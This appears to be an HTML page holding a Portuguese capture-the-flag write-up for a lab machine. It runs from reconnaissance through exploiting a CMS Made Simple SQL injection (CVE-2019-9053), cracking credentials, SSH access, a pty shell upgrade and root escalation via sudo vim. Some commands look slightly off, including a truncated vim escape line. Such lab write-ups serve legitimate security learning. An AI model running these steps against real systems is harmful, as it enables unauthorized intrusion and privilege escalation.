@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Relevant</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="../css/writeup.css">
+    </head>
+    <body>
+        <div class="container">
+            <li><a href="../index.html" class="botao-grande"><font color="white">< Insecure Net</font> Homepage</a></li>
+        </div>
+<pre><span id="span-title"></font></span>
+    <span><font color="red">my 'Relevant' writeup</font></span><br>
+    
+    <font color="white">
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡋⠁⠀⠀⠀⠀⢀⣀⣀⡀
+⠀⠀⠀⠀⠀⠠⠒⣶⣶⣿⣿⣷⣾⣿⣿⣿⣿⣛⣋⣉⠀⠀
+⠀⠀⠀⠀⢀⣤⣞⣫⣿⣿⣿⡻⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀
+⠀⠀⣶⣾⡿⠿⠿⠿⠿⠋⠈⠀⣸⣿⣿⣿⣿⣷⡈⠙⢆⠀
+⠀⠀⠉⠁⠀⠤⣤⣤⣤⣤⣶⣾⣿⣿⣿⣿⠿⣿⣷⠀⠀⠀
+⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⢹⣿⠀⠀⠀
+⢠⣾⣿⣿⣿⣿⠟⠋⠉⠛⠋⠉⠁⣀⠀⠀⠀⠸⠃⠀⠀⠀
+⣿⣿⣿⣿⠹⣇⠀⠀⠀⠀⢀⡀⠀⢀⡙⢷⣦⣄⡀⠀⠀⠀
+⣿⢿⣿⣿⣷⣦⠤⠤⠀⠀⣠⣿⣶⣶⣿⣿⣿⣿⣿⣷⣄⠀
+⠈⠈⣿⡿⢿⣿⣿⣷⣿⣿⡿⢿⣿⣿⣁⡀⠀⠀⠉⢻⣿⣧
+⠀⢀⡟⠀⠀⠉⠛⠙⠻⢿⣦⡀⠙⠛⠯⠤⠄⠀⠀⠈⠈⣿
+⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡆⠀⠀⠀⠀⠀⠀⠀⢀⠟  
+</font>
+
+
+    Site: http://10.10.73.242/
+
+    [Nmap]: nmap -sV --open -T5 10.10.73.242 -uN nmap.txt
+
+    PORT     STATE SERVICE REASON  VERSION
+    21/tcp   open  ftp     syn-ack vsftpd 3.0.3
+    80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+    2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+
+    [Check robots.txt]
+
+    Disallow: /openemr-5_0_1_3
+    End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
+
+    Pensei que 'mike' poderia ser um usuario, talvez até seja... Coloquei para brutar o SSH e sem sucesso.
+
+
+
+    [ffuf]: ffuf -u http://10.10.73.242/FUZZ -w /home/s1x/red/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -c
+
+    simple                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 201ms]
+
+
+
+    Depois de um tempo rodando e ter encontrado diretórios padrões, tinha um em especifico, "/simple" que roda uma aplicação web que faz parte do CMS "CMS Made Simple version 2.2.8", após uma busca no google descobrimos duas vulnerabilidades para esta versão, uma é o CVE CVE-2019-9053 que se trata de um SQLi e o CVE-2019-9055, que é um RCE.
+
+    Testei o CVE-2019-9055 no metasploit, porém sem suceso... Então eu encontrei um script exploit pronto para o SQLi, o script basicamente faz um bruteforce de payloads para extração de informações do banco de dados, um sqli manual.
+
+    Provavelmente se tornou um CVE porque o banco de dados é padrão, caso ele fosse diferente para cada aplicação este exploit não funcionaria.
+
+    Exploit: https://www.exploit-db.com/exploits/46635
+
+
+
+    Depois de bastante tempo, problemas de conexão, consegui rodar o exploit e ele capturou informações do banco de dados:
+
+    [CVE-2019-9053]: python cve.py -u http://10.10.73.242/simple --crack -w best110.txt
+
+    [+] Salt for password found: 1dac0d92e9fa6bb2
+    [+] Username found: mitch
+    [+] Email found: admin@admin.com
+    [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+    [+] Password cracked: secret
+
+
+    Com mais um pequeno bruteforce de diretório no CMS, encontrei a página de admin.
+
+    Admin page: http://10.10.73.242/simple/admin
+
+    Então, no painel fiz algumas tentativas de uplaod de webshell, tentei pouco... então lembrei que eu tinha credenciais e tentei logar no ssh.
+
+    ssh -p 2222 -u mitch@10.10.73.242
+
+    3nj0yy!
+
+    $ id;uname -srvi
+    uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
+    Linux 4.15.0-58-generic #64~16.04.1-Ubuntu SMP Wed Aug 7 14:09:34 UTC 2019 i686
+
+    Ban!
+
+
+    Ok, melhorar só um pouquinho a shell, se precisar de full tty faremos isso.
+
+    [Basic tty]: python3 -c 'import os,pty; pty.spawn("/bin/bash")'
+
+    Depois de pegar a flag do nosso user, partimos para o root...
+
+    Primeira coisa que fiz foi checar o sudoers com sudo -l
+
+    Vi que o vim podia ser executado com privilégios, então fui até o gtfobins
+
+    vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; ex
+
+    Então conseguimos nossa shell
+
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
+
+    3nj0y your r00000t shell
+
+    end.
+</pre>
+    </body>
+</html>
